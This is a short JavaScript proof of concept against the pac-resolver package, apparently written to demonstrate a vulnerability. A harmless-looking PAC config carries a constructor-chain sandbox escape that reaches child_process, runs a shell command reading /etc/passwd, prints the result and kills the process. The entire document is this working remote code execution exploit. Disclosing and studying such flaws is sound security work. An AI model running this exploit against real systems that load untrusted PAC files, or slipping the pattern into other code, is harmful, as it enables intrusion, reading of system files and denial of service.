const pac = require('pac-resolver');
pac(`
    // Real PAC config:
    function FindProxyForURL(url, host) {
        return "DIRECT";
    }

    // But also run arbitrary code:
    var f = this.constructor.constructor(\`
        // Running outside the sandbox:
        var a=process.mainModule.require('child_process').execSync('cat /etc/passwd').toString();
        console.log(a);
        process.exit(100); // Kill the vulnerable process
        // etc etc
    \`);

    f();
`);
